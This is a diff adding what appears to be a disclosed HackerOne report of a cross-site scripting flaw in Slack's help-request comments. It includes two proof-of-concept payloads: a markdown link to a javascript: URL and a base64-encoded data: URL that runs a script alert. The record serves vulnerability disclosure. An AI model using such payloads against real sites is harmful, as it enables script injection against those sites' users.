@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/116419
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/securitythinker
+ReportedTo:Slack(slack)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:30.04.2016 22:10:30
+
+Summary:
+
+good day: 
+ i found an xss issue when making a help request..
+https://hunter22.slack.com/help/requests/new
+
+with this xss payload:
+[Click here](javascript:alert(document.domain))
+[click this link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+
+when try to comment the xss payload , then upon clicking xss payload executed.
